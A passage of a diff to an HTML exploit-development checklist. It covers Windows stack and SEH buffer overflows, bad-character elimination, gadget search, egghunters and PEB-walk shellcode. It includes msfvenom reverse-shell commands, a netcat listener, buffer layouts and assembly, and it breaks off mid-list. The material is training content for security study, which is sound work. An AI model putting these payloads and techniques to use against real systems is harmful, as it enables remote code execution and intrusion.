-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a></li></ul>
 
 <h3 id="methodology-badchars-ret">1.4 Bad Characters &amp; Return Address</h3>
-<ul><li>Eliminate every byte that gets mangled in transit, then find a clean return address from a compatible module.</li></ul>
+<ul><li><input type="checkbox"> Eliminate every byte that gets mangled in transit, then find a clean return address from a compatible module.</li></ul>
 <h3 id="methodology-badchars-ret-badchar-elim">1.4.1 Bad Character Elimination</h3>
   <ul>
-    <li>Generate a test array of all bytes 0x01&ndash;0xFF:
+    <li><input type="checkbox"> Generate a test array of all bytes 0x01&ndash;0xFF:
       <ul>
-        <li>Python: <code>badchars = bytes(range(1, 256))</code></li>
-        <li>Place after the EIP/SEH overwrite: <code>buf = padding + ret_addr + badchars</code></li>
-        <li>Null byte (<code>\x00</code>) is always bad &mdash; start at 0x01</li>
+        <li><input type="checkbox"> Python: <code>badchars = bytes(range(1, 256))</code></li>
+        <li><input type="checkbox"> Place after the EIP/SEH overwrite: <code>buf = padding + ret_addr + badchars</code></li>
+        <li><input type="checkbox"> Null byte (<code>\x00</code>) is always bad &mdash; start at 0x01</li>
       </ul>
     </li>
-    <li>Inspect the buffer in memory for corruption:
+    <li><input type="checkbox"> Inspect the buffer in memory for corruption:
       <ul>
-        <li><code>db esp L100</code> &mdash; walk through the sequence byte by byte</li>
-        <li>Where the sequence breaks or jumps &rarr; that byte is bad</li>
-        <li>Common bad chars: <code>\x00</code> (null), <code>\x0a</code> (LF), <code>\x0d</code> (CR), <code>\x20</code> (space)</li>
+        <li><input type="checkbox"> <code>db esp L100</code> &mdash; walk through the sequence byte by byte</li>
+        <li><input type="checkbox"> Where the sequence breaks or jumps &rarr; that byte is bad</li>
+        <li><input type="checkbox"> Common bad chars: <code>\x00</code> (null), <code>\x0a</code> (LF), <code>\x0d</code> (CR), <code>\x20</code> (space)</li>
       </ul>
     </li>
-    <li>Remove confirmed bad chars and repeat:
+    <li><input type="checkbox"> Remove confirmed bad chars and repeat:
       <ul>
-        <li>Remove the identified bad byte from the array</li>
-        <li>Re-send and re-inspect &mdash; the byte after the removed one may now reveal another bad char</li>
-        <li>Repeat until the full sequence survives intact in memory</li>
+        <li><input type="checkbox"> Remove the identified bad byte from the array</li>
+        <li><input type="checkbox"> Re-send and re-inspect &mdash; the byte after the removed one may now reveal another bad char</li>
+        <li><input type="checkbox"> Repeat until the full sequence survives intact in memory</li>
       </ul>
     </li>
   </ul>
@@ -896,11 +898,11 @@ buf += badchars                # inspect this in memory
 # db esp L100  — walk byte by byte, where the sequence breaks = bad char
 # Remove the bad char, regenerate, re-send, repeat until clean</code></pre>
   <ul>
-    <li>Alternative: use mona for automated comparison:
+    <li><input type="checkbox"> Alternative: use mona for automated comparison:
       <ul>
-        <li><code>!py mona bytearray -b "\x00"</code> &mdash; generate reference file</li>
-        <li><code>!py mona compare -f C:\mona\bytearray.bin -a esp</code> &mdash; compare memory vs reference</li>
-        <li>mona highlights all corrupted positions automatically</li>
+        <li><input type="checkbox"> <code>!py mona bytearray -b "\x00"</code> &mdash; generate reference file</li>
+        <li><input type="checkbox"> <code>!py mona compare -f C:\mona\bytearray.bin -a esp</code> &mdash; compare memory vs reference</li>
+        <li><input type="checkbox"> mona highlights all corrupted positions automatically</li>
       </ul>
     </li>
   </ul>
@@ -969,24 +971,24 @@ buf += badchars                # inspect this in memory
 
 <h3 id="methodology-badchars-ret-module-selection">1.4.2 Module Selection</h3>
   <ul>
-    <li>List all loaded modules and their protections:
+    <li><input type="checkbox"> List all loaded modules and their protections:
       <ul>
-        <li><code>lm</code> &mdash; list modules with base addresses</li>
-        <li><code>!py mona modules</code> &mdash; shows ASLR, SafeSEH, Rebase, NXCompat per module</li>
+        <li><input type="checkbox"> <code>lm</code> &mdash; list modules with base addresses</li>
+        <li><input type="checkbox"> <code>!py mona modules</code> &mdash; shows ASLR, SafeSEH, Rebase, NXCompat per module</li>
       </ul>
     </li>
-    <li>Pick a module that lacks all mitigations:
+    <li><input type="checkbox"> Pick a module that lacks all mitigations:
       <ul>
-        <li>No ASLR (base address is static across reboots)</li>
-        <li>No SafeSEH (for SEH-based exploits &mdash; allows arbitrary handler addresses)</li>
-        <li>No Rebase</li>
-        <li>Ideally NXCompat = False (no DEP) for stack-based shellcode execution</li>
+        <li><input type="checkbox"> No ASLR (base address is static across reboots)</li>
+        <li><input type="checkbox"> No SafeSEH (for SEH-based exploits &mdash; allows arbitrary handler addresses)</li>
+        <li><input type="checkbox"> No Rebase</li>
+        <li><input type="checkbox"> Ideally NXCompat = False (no DEP) for stack-based shellcode execution</li>
       </ul>
     </li>
-    <li>Verify the module base is constant:
+    <li><input type="checkbox"> Verify the module base is constant:
       <ul>
-        <li>Run <code>lm m [module]</code> across multiple reboots</li>
-        <li>If the base changes &rarr; ASLR is active, pick a different module</li>
+        <li><input type="checkbox"> Run <code>lm m [module]</code> across multiple reboots</li>
+        <li><input type="checkbox"> If the base changes &rarr; ASLR is active, pick a different module</li>
       </ul>
     </li>
   </ul>
@@ -1007,18 +1009,18 @@ lm m targetapp                  # same base = no ASLR
 
 <h3 id="methodology-badchars-ret-ret-addr-discovery">1.4.3 Return Address Discovery</h3>
   <ul>
-    <li>For stack BOF: find a JMP ESP gadget:
+    <li><input type="checkbox"> For stack BOF: find a JMP ESP gadget:
       <ul>
-        <li><code>s -b [base] [base+size] ff e4</code> &mdash; search for <code>JMP ESP</code> (<code>\xff\xe4</code>)</li>
-        <li>Alternative: <code>!py mona find -s "\xff\xe4" -m [module]</code></li>
-        <li>Verify the address bytes do not contain any bad characters</li>
+        <li><input type="checkbox"> <code>s -b [base] [base+size] ff e4</code> &mdash; search for <code>JMP ESP</code> (<code>\xff\xe4</code>)</li>
+        <li><input type="checkbox"> Alternative: <code>!py mona find -s "\xff\xe4" -m [module]</code></li>
+        <li><input type="checkbox"> Verify the address bytes do not contain any bad characters</li>
       </ul>
     </li>
-    <li>For SEH overflow: find a POP/POP/RET gadget:
+    <li><input type="checkbox"> For SEH overflow: find a POP/POP/RET gadget:
       <ul>
-        <li><code>s -[1]b 0 L?80000000 5? 5? c3</code> &mdash; search for POP r32 / POP r32 / RET</li>
-        <li><code>!py mona seh -b "\x00\x0a\x0d"</code> &mdash; automated search excluding bad chars</li>
-        <li>Gadget must come from a SafeSEH=False module</li>
+        <li><input type="checkbox"> <code>s -[1]b 0 L?80000000 5? 5? c3</code> &mdash; search for POP r32 / POP r32 / RET</li>
+        <li><input type="checkbox"> <code>!py mona seh -b "\x00\x0a\x0d"</code> &mdash; automated search excluding bad chars</li>
+        <li><input type="checkbox"> Gadget must come from a SafeSEH=False module</li>
       </ul>
     </li>
   </ul>
@@ -1032,36 +1034,36 @@ s -[1]b 0 L?80000000 5? 5? c3
 !py mona find -s "\xff\xe4" -m targetapp        # JMP ESP
 !py mona seh -b "\x00\x0a\x0d"                  # POP/POP/RET for SEH</code></pre>
   <ul>
-    <li>Validate the gadget in WinDbg:
+    <li><input type="checkbox"> Validate the gadget in WinDbg:
       <ul>
-        <li><code>u [gadget_addr]</code> &mdash; disassemble to confirm the instruction sequence</li>
-        <li>Set a breakpoint: <code>bp [gadget_addr]</code> and re-send the exploit</li>
-        <li>Step through to confirm execution reaches your shellcode</li>
+        <li><input type="checkbox"> <code>u [gadget_addr]</code> &mdash; disassemble to confirm the instruction sequence</li>
+        <li><input type="checkbox"> Set a breakpoint: <code>bp [gadget_addr]</code> and re-send the exploit</li>
+        <li><input type="checkbox"> Step through to confirm execution reaches your shellcode</li>
       </ul>
     </li>
   </ul>
 <p><strong>References:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a> &middot; <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener noreferrer">Corelan SEH</a></p>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a> &middot; <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener noreferrer">Corelan SEH</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a> &middot; <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener noreferrer">Corelan SEH</a></li></ul>
 
 <h3 id="methodology-stack-bof">1.5 Stack Buffer Overflow Exploitation</h3>
-<ul><li>Assemble the exploit payload: padding &rarr; return address &rarr; NOP sled &rarr; shellcode. Adapt the layout for direct EIP overwrite vs SEH-based overwrite.</li></ul>
+<ul><li><input type="checkbox"> Assemble the exploit payload: padding &rarr; return address &rarr; NOP sled &rarr; shellcode. Adapt the layout for direct EIP overwrite vs SEH-based overwrite.</li></ul>
 <h3 id="methodology-stack-bof-classic-bof">1.5.1 Classic Stack BOF</h3>
   <ul>
-    <li>Build the exploit buffer layout:
+    <li><input type="checkbox"> Build the exploit buffer layout:
       <ul>
-        <li>Layout: <code>padding + JMP_ESP + NOP_sled + shellcode</code></li>
-        <li>Padding: <code>b"A" * offset</code></li>
-        <li>Return address: <code>struct.pack("&lt;I", 0x10090c83)</code> &mdash; JMP ESP from non-ASLR module</li>
-        <li>NOP sled: <code>b"\x90" * 16</code> &mdash; landing zone</li>
+        <li><input type="checkbox"> Layout: <code>padding + JMP_ESP + NOP_sled + shellcode</code></li>
+        <li><input type="checkbox"> Padding: <code>b"A" * offset</code></li>
+        <li><input type="checkbox"> Return address: <code>struct.pack("&lt;I", 0x10090c83)</code> &mdash; JMP ESP from non-ASLR module</li>
+        <li><input type="checkbox"> NOP sled: <code>b"\x90" * 16</code> &mdash; landing zone</li>
       </ul>
     </li>
-    <li>Generate shellcode with msfvenom:
+    <li><input type="checkbox"> Generate shellcode with msfvenom:
       <ul>
-        <li><code>msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=443 -f python -v shellcode -b "\x00\x0a\x0d"</code></li>
-        <li>For staged: <code>msfvenom -p windows/meterpreter/reverse_tcp ...</code></li>
-        <li>For x64: <code>msfvenom -p windows/x64/shell_reverse_tcp ...</code></li>
-        <li>Add encoder: <code>-e x86/shikata_ga_nai</code> for polymorphic encoding</li>
+        <li><input type="checkbox"> <code>msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=443 -f python -v shellcode -b "\x00\x0a\x0d"</code></li>
+        <li><input type="checkbox"> For staged: <code>msfvenom -p windows/meterpreter/reverse_tcp ...</code></li>
+        <li><input type="checkbox"> For x64: <code>msfvenom -p windows/x64/shell_reverse_tcp ...</code></li>
+        <li><input type="checkbox"> Add encoder: <code>-e x86/shikata_ga_nai</code> for polymorphic encoding</li>
       </ul>
     </li>
   </ul>
@@ -1091,12 +1093,12 @@ s.connect(("[ip]", [port]))
 s.send(buf)
 s.close()</code></pre>
   <ul>
-    <li>Assemble and send the final exploit:
+    <li><input type="checkbox"> Assemble and send the final exploit:
       <ul>
-        <li><code>buf = b"A" * OFFSET + JMP_ESP + b"\x90" * 16 + shellcode</code></li>
-        <li>Start a listener before sending: <code>nc -lvnp 443</code></li>
-        <li>Send the buffer to the target service</li>
-        <li>Confirm shell callback and run <code>whoami</code></li>
+        <li><input type="checkbox"> <code>buf = b"A" * OFFSET + JMP_ESP + b"\x90" * 16 + shellcode</code></li>
+        <li><input type="checkbox"> Start a listener before sending: <code>nc -lvnp 443</code></li>
+        <li><input type="checkbox"> Send the buffer to the target service</li>
+        <li><input type="checkbox"> Confirm shell callback and run <code>whoami</code></li>
       </ul>
     </li>
   </ul>
@@ -1141,23 +1143,23 @@ s.close()</code></pre>
 
 <h3 id="methodology-stack-bof-seh-overflow">1.5.2 SEH-Based Overflow</h3>
   <ul>
-    <li>Confirm SEH chain is overwritten:
+    <li><input type="checkbox"> Confirm SEH chain is overwritten:
       <ul>
-        <li><code>!exchain</code> &mdash; should show your controlled values in the handler chain</li>
-        <li>nSEH is at offset N, SEH handler is at offset <code>N + 4</code></li>
+        <li><input type="checkbox"> <code>!exchain</code> &mdash; should show your controlled values in the handler chain</li>
+        <li><input type="checkbox"> nSEH is at offset N, SEH handler is at offset <code>N + 4</code></li>
       </ul>
     </li>
-    <li>Set nSEH to a short forward jump:
+    <li><input type="checkbox"> Set nSEH to a short forward jump:
       <ul>
-        <li><code>nseh = b"\xeb\x06\x90\x90"</code> &mdash; short JMP +6 to skip over the 4-byte SEH field</li>
-        <li>After POP/POP/RET executes, control lands on nSEH, which jumps forward into shellcode</li>
+        <li><input type="checkbox"> <code>nseh = b"\xeb\x06\x90\x90"</code> &mdash; short JMP +6 to skip over the 4-byte SEH field</li>
+        <li><input type="checkbox"> After POP/POP/RET executes, control lands on nSEH, which jumps forward into shellcode</li>
       </ul>
     </li>
-    <li>Set SEH handler to POP/POP/RET gadget:
+    <li><input type="checkbox"> Set SEH handler to POP/POP/RET gadget:
       <ul>
-        <li>Find with <code>!py mona seh -b "\x00\x0a\x0d"</code></li>
-        <li>Manual search: <code>s -[1]b 0 L?80000000 5? 5? c3</code> (POP r32 / POP r32 / RET)</li>
-        <li>Must come from a module with SafeSEH disabled</li>
+        <li><input type="checkbox"> Find with <code>!py mona seh -b "\x00\x0a\x0d"</code></li>
+        <li><input type="checkbox"> Manual search: <code>s -[1]b 0 L?80000000 5? 5? c3</code> (POP r32 / POP r32 / RET)</li>
+        <li><input type="checkbox"> Must come from a module with SafeSEH disabled</li>
       </ul>
     </li>
   </ul>
@@ -1175,10 +1177,10 @@ buf += shellcode                # reverse shell payload
 
 # Flow: crash → SEH dispatch → POP/POP/RET → lands on nSEH → JMP +6 → NOPs → shellcode</code></pre>
   <ul>
-    <li>Build the full SEH exploit:
+    <li><input type="checkbox"> Build the full SEH exploit:
       <ul>
-        <li><code>buf = b"A" * OFFSET + nseh + struct.pack("&lt;I", PPR) + b"\x90" * 16 + shellcode</code></li>
-        <li>Trigger the exception &mdash; execution flows: crash &rarr; SEH dispatch &rarr; POP/POP/RET &rarr; nSEH &rarr; JMP +6 &rarr; shellcode</li>
+        <li><input type="checkbox"> <code>buf = b"A" * OFFSET + nseh + struct.pack("&lt;I", PPR) + b"\x90" * 16 + shellcode</code></li>
+        <li><input type="checkbox"> Trigger the exception &mdash; execution flows: crash &rarr; SEH dispatch &rarr; POP/POP/RET &rarr; nSEH &rarr; JMP +6 &rarr; shellcode</li>
       </ul>
     </li>
   </ul>
@@ -1186,53 +1188,53 @@ buf += shellcode                # reverse shell payload
 
 <h3 id="methodology-stack-bof-island-hopping">1.5.3 Island Hopping</h3>
   <ul>
-    <li>When shellcode space is split across non-contiguous buffer regions:
+    <li><input type="checkbox"> When shellcode space is split across non-contiguous buffer regions:
       <ul>
-        <li>Map all locations where your input lands in memory</li>
-        <li>Use <code>s -a 0 L?80000000 "AAAA"</code> to find all copies of your buffer</li>
+        <li><input type="checkbox"> Map all locations where your input lands in memory</li>
+        <li><input type="checkbox"> Use <code>s -a 0 L?80000000 "AAAA"</code> to find all copies of your buffer</li>
       </ul>
     </li>
-    <li>Chain jumps between buffer islands:
+    <li><input type="checkbox"> Chain jumps between buffer islands:
       <ul>
-        <li>Short JMP: <code>\xeb\xNN</code> &mdash; ±127 bytes relative, 2 bytes total</li>
-        <li>Near JMP: <code>\xe9</code> + signed 4-byte offset &mdash; ±2GB range, 5 bytes total</li>
-        <li>Calculate the offset: <code>target_addr - (current_addr + jmp_instruction_size)</code></li>
+        <li><input type="checkbox"> Short JMP: <code>\xeb\xNN</code> &mdash; ±127 bytes relative, 2 bytes total</li>
+        <li><input type="checkbox"> Near JMP: <code>\xe9</code> + signed 4-byte offset &mdash; ±2GB range, 5 bytes total</li>
+        <li><input type="checkbox"> Calculate the offset: <code>target_addr - (current_addr + jmp_instruction_size)</code></li>
       </ul>
     </li>
-    <li>Use a staged approach for complex layouts:
+    <li><input type="checkbox"> Use a staged approach for complex layouts:
       <ul>
-        <li>Stage 1: short jump from nSEH/EIP area to first island</li>
-        <li>Stage 2: near jump from first island to the largest contiguous region</li>
-        <li>Stage 3: full shellcode in the largest region</li>
+        <li><input type="checkbox"> Stage 1: short jump from nSEH/EIP area to first island</li>
+        <li><input type="checkbox"> Stage 2: near jump from first island to the largest contiguous region</li>
+        <li><input type="checkbox"> Stage 3: full shellcode in the largest region</li>
       </ul>
     </li>
   </ul>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a> &middot; <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener noreferrer">Corelan SEH</a> &middot; <a href="https://www.fuzzysecurity.com/tutorials/expDev/1.html" target="_blank" rel="noopener noreferrer">FuzzySecurity Exploit Dev</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer">Corelan Stack BOF</a> &middot; <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener noreferrer">Corelan SEH</a> &middot; <a href="https://www.fuzzysecurity.com/tutorials/expDev/1.html" target="_blank" rel="noopener noreferrer">FuzzySecurity Exploit Dev</a></li></ul>
 
 <h3 id="methodology-space-constrained">1.6 Space-Constrained Exploitation</h3>
-<ul><li>When the available buffer after the overwrite is too small for shellcode (&lt;400 bytes), use an egghunter or jump backward to a larger region.</li></ul>
+<ul><li><input type="checkbox"> When the available buffer after the overwrite is too small for shellcode (&lt;400 bytes), use an egghunter or jump backward to a larger region.</li></ul>
 <h3 id="methodology-space-constrained-egghunter-ntaccess">1.6.1 Egghunter (NtAccessCheck)</h3>
   <ul>
-    <li>Understand the egghunter mechanism:
+    <li><input type="checkbox"> Understand the egghunter mechanism:
       <ul>
-        <li>~32 bytes &mdash; fits in the smallest buffer space</li>
-        <li>Uses syscall <code>0x02</code> (NtAccessCheckAndAuditAlarm) to safely probe memory pages</li>
-        <li>Skips inaccessible pages without crashing, scans for the egg tag</li>
+        <li><input type="checkbox"> ~32 bytes &mdash; fits in the smallest buffer space</li>
+        <li><input type="checkbox"> Uses syscall <code>0x02</code> (NtAccessCheckAndAuditAlarm) to safely probe memory pages</li>
+        <li><input type="checkbox"> Skips inaccessible pages without crashing, scans for the egg tag</li>
       </ul>
     </li>
-    <li>Set the egg tag:
+    <li><input type="checkbox"> Set the egg tag:
       <ul>
-        <li><code>EGG = b"w00tw00t"</code> &mdash; 8-byte tag (repeated 4-byte pattern)</li>
-        <li>Prepend the tag to your full shellcode placed elsewhere in memory</li>
-        <li>The tag must be unique &mdash; <code>w00t</code> repeated ensures uniqueness vs the scanner code itself</li>
+        <li><input type="checkbox"> <code>EGG = b"w00tw00t"</code> &mdash; 8-byte tag (repeated 4-byte pattern)</li>
+        <li><input type="checkbox"> Prepend the tag to your full shellcode placed elsewhere in memory</li>
+        <li><input type="checkbox"> The tag must be unique &mdash; <code>w00t</code> repeated ensures uniqueness vs the scanner code itself</li>
       </ul>
     </li>
-    <li>Build the egghunter with Keystone:
+    <li><input type="checkbox"> Build the egghunter with Keystone:
       <ul>
-        <li>Assemble the NtAccessCheck egghunter using Keystone from Python</li>
-        <li>Verify assembled bytes are null-free and contain no bad chars</li>
-        <li>Place egghunter at the small buffer, full shellcode (with egg tag) at the large buffer</li>
+        <li><input type="checkbox"> Assemble the NtAccessCheck egghunter using Keystone from Python</li>
+        <li><input type="checkbox"> Verify assembled bytes are null-free and contain no bad chars</li>
+        <li><input type="checkbox"> Place egghunter at the small buffer, full shellcode (with egg tag) at the large buffer</li>
       </ul>
     </li>
   </ul>
@@ -1265,92 +1267,92 @@ addr_loop:
 egghunter, _ = ks.asm(egghunter_asm)
 egghunter = bytes(egghunter)</code></pre>
   <ul>
-    <li>Exploit layout with egghunter:
+    <li><input type="checkbox"> Exploit layout with egghunter:
       <ul>
-        <li>Small buffer: <code>padding + JMP_ESP/PPR + egghunter</code> (~32 bytes)</li>
-        <li>Large buffer: <code>EGG + shellcode</code> (sent in another field, earlier in the message, or via separate request)</li>
-        <li>Egghunter scans all readable memory until it finds the egg, then jumps past the tag to shellcode</li>
+        <li><input type="checkbox"> Small buffer: <code>padding + JMP_ESP/PPR + egghunter</code> (~32 bytes)</li>
+        <li><input type="checkbox"> Large buffer: <code>EGG + shellcode</code> (sent in another field, earlier in the message, or via separate request)</li>
+        <li><input type="checkbox"> Egghunter scans all readable memory until it finds the egg, then jumps past the tag to shellcode</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-space-constrained-egghunter-seh">1.6.2 Egghunter (SEH-Based)</h3>
   <ul>
-    <li>Use when syscall numbers are unreliable:
+    <li><input type="checkbox"> Use when syscall numbers are unreliable:
       <ul>
-        <li>~60 bytes &mdash; larger than NtAccessCheck variant but works across Windows 7&ndash;10</li>
-        <li>Installs its own SEH handler to catch access violations during scanning</li>
-        <li>No dependency on a specific syscall number</li>
+        <li><input type="checkbox"> ~60 bytes &mdash; larger than NtAccessCheck variant but works across Windows 7&ndash;10</li>
+        <li><input type="checkbox"> Installs its own SEH handler to catch access violations during scanning</li>
+        <li><input type="checkbox"> No dependency on a specific syscall number</li>
       </ul>
     </li>
-    <li>Build and test:
+    <li><input type="checkbox"> Build and test:
       <ul>
-        <li>Assemble with Keystone or use a known-good template</li>
-        <li>Test on the target OS version to confirm it works with that build&rsquo;s exception handling</li>
-        <li>Verify with <code>db esp L40</code> that the egghunter is intact in memory</li>
+        <li><input type="checkbox"> Assemble with Keystone or use a known-good template</li>
+        <li><input type="checkbox"> Test on the target OS version to confirm it works with that build&rsquo;s exception handling</li>
+        <li><input type="checkbox"> Verify with <code>db esp L40</code> that the egghunter is intact in memory</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-space-constrained-partial-eip">1.6.3 Partial EIP Overwrite</h3>
   <ul>
-    <li>When null bytes truncate the overwrite:
+    <li><input type="checkbox"> When null bytes truncate the overwrite:
       <ul>
-        <li>Only the low 1&ndash;2 bytes of saved EIP get overwritten</li>
-        <li>High bytes remain from the original return address &mdash; stay within the same module</li>
+        <li><input type="checkbox"> Only the low 1&ndash;2 bytes of saved EIP get overwritten</li>
+        <li><input type="checkbox"> High bytes remain from the original return address &mdash; stay within the same module</li>
       </ul>
     </li>
-    <li>Exploit the partial overwrite:
+    <li><input type="checkbox"> Exploit the partial overwrite:
       <ul>
-        <li>Find a useful gadget within the same page (same high bytes)</li>
-        <li>Overwrite only the low byte(s) to redirect execution</li>
-        <li>Example: if saved EIP is <code>0x00401234</code>, overwrite low byte to <code>\x78</code> &rarr; execution goes to <code>0x00401278</code></li>
+        <li><input type="checkbox"> Find a useful gadget within the same page (same high bytes)</li>
+        <li><input type="checkbox"> Overwrite only the low byte(s) to redirect execution</li>
+        <li><input type="checkbox"> Example: if saved EIP is <code>0x00401234</code>, overwrite low byte to <code>\x78</code> &rarr; execution goes to <code>0x00401278</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-space-constrained-backward-jump">1.6.4 Backward Jump Technique</h3>
   <ul>
-    <li>Jump backward into the padding area before EIP:
+    <li><input type="checkbox"> Jump backward into the padding area before EIP:
       <ul>
-        <li><code>\xeb\xf0</code> &mdash; JMP SHORT backward 16 bytes (signed: <code>-16</code>)</li>
-        <li>Adjust the offset byte to land in your controlled A-buffer before the overwrite point</li>
+        <li><input type="checkbox"> <code>\xeb\xf0</code> &mdash; JMP SHORT backward 16 bytes (signed: <code>-16</code>)</li>
+        <li><input type="checkbox"> Adjust the offset byte to land in your controlled A-buffer before the overwrite point</li>
       </ul>
     </li>
-    <li>Chain backward jumps if needed:
+    <li><input type="checkbox"> Chain backward jumps if needed:
       <ul>
-        <li>Place a near JMP at the backward landing point</li>
-        <li><code>\xe9</code> + signed 4-byte offset for a ±2GB jump to the real shellcode</li>
-        <li>Calculate: <code>offset = target_addr - (current_addr + 5)</code> (near JMP is 5 bytes)</li>
+        <li><input type="checkbox"> Place a near JMP at the backward landing point</li>
+        <li><input type="checkbox"> <code>\xe9</code> + signed 4-byte offset for a ±2GB jump to the real shellcode</li>
+        <li><input type="checkbox"> Calculate: <code>offset = target_addr - (current_addr + 5)</code> (near JMP is 5 bytes)</li>
       </ul>
     </li>
-    <li>Use the A-buffer for shellcode placement:
+    <li><input type="checkbox"> Use the A-buffer for shellcode placement:
       <ul>
-        <li>Place full shellcode at the start of the buffer (before the padding)</li>
-        <li>Backward jump chain lands in the shellcode</li>
-        <li>Ensure no bad chars in the jump instruction bytes</li>
+        <li><input type="checkbox"> Place full shellcode at the start of the buffer (before the padding)</li>
+        <li><input type="checkbox"> Backward jump chain lands in the shellcode</li>
+        <li><input type="checkbox"> Ensure no bad chars in the jump instruction bytes</li>
       </ul>
     </li>
   </ul>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener noreferrer">Corelan Egghunters</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener noreferrer">Corelan Egghunters</a></li></ul>
 
 <h3 id="methodology-shellcode-dev">1.7 Custom Shellcode Development</h3>
-<ul><li>When msfvenom payloads are blocked or too large, build custom position-independent shellcode from scratch using the PEB walk and EAT resolution pattern.</li></ul>
+<ul><li><input type="checkbox"> When msfvenom payloads are blocked or too large, build custom position-independent shellcode from scratch using the PEB walk and EAT resolution pattern.</li></ul>
 <h3 id="methodology-shellcode-dev-peb-walk">1.7.1 PEB Walk &amp; Module Resolution</h3>
   <ul>
-    <li>Locate kernel32.dll base address via PEB:
+    <li><input type="checkbox"> Locate kernel32.dll base address via PEB:
       <ul>
-        <li><code>mov eax, fs:[0x30]</code> &mdash; Thread Environment Block &rarr; PEB pointer</li>
-        <li><code>mov eax, [eax+0x0C]</code> &mdash; PEB &rarr; PEB_LDR_DATA</li>
-        <li><code>mov eax, [eax+0x14]</code> &mdash; Ldr &rarr; InMemoryOrderModuleList (first entry = exe itself)</li>
+        <li><input type="checkbox"> <code>mov eax, fs:[0x30]</code> &mdash; Thread Environment Block &rarr; PEB pointer</li>
+        <li><input type="checkbox"> <code>mov eax, [eax+0x0C]</code> &mdash; PEB &rarr; PEB_LDR_DATA</li>
+        <li><input type="checkbox"> <code>mov eax, [eax+0x14]</code> &mdash; Ldr &rarr; InMemoryOrderModuleList (first entry = exe itself)</li>
       </ul>
     </li>
-    <li>Walk the InMemoryOrderModuleList:
+    <li><input type="checkbox"> Walk the InMemoryOrderModuleList:
       <ul>
-        <li><code>mov eax, [eax]</code> &mdash; second entry (ntdll.dll)</li>
-        <li><code>mov eax, [eax]</code> &mdash; third entry (kernel32.dll)</li>
-        <li><code>mov eax, [eax+0x10]</code> &mdash; DllBase &mdash; kernel32 base address now in EAX</li>
+        <li><input type="checkbox"> <code>mov eax, [eax]</code> &mdash; second entry (ntdll.dll)</li>
+        <li><input type="checkbox"> <code>mov eax, [eax]</code> &mdash; third entry (kernel32.dll)</li>
+        <li><input type="checkbox"> <code>mov eax, [eax+0x10]</code> &mdash; DllBase &mdash; kernel32 base address now in EAX</li>
       </ul>
     </li>
   </ul>
@@ -1362,11 +1364,11 @@ mov eax, [eax]           ; 2nd entry (ntdll.dll)
 mov eax, [eax]           ; 3rd entry (kernel32.dll)
 mov eax, [eax+0x10]      ; DllBase — kernel32 base address in EAX</code></pre>
   <ul>
-    <li>Verify in WinDbg:
+    <li><input type="checkbox"> Verify in WinDbg:
       <ul>
-        <li><code>!peb</code> &mdash; display PEB contents</li>
-        <li><code>dt ntdll!_PEB_LDR_DATA poi(poi(fs:[0x30])+0x0c)</code> &mdash; dump Ldr structure</li>
-        <li>Confirm the third InMemoryOrder entry is kernel32</li>
+        <li><input type="checkbox"> <code>!peb</code> &mdash; display PEB contents</li>
+        <li><input type="checkbox"> <code>dt ntdll!_PEB_LDR_DATA poi(poi(fs:[0x30])+0x0c)</code> &mdash; dump Ldr structure</li>
+        <li><input type="checkbox"> Confirm the third InMemoryOrder entry is kernel32</li>
       </ul>
     </li>
   </ul>
@@ -1423,26 +1425,26 @@ mov eax, [eax+0x10]      ; DllBase — kernel32 base address in EAX</code></pre>
 
 <h3 id="methodology-shellcode-dev-eat-resolution">1.7.2 Export Address Table Resolution</h3>
   <ul>
-    <li>Parse the PE headers to find the Export Directory:
+    <li><input type="checkbox"> Parse the PE headers to find the Export Directory:
       <ul>
-        <li><code>PE_signature = [kernel32_base + 0x3C]</code> &mdash; e_lfanew offset</li>
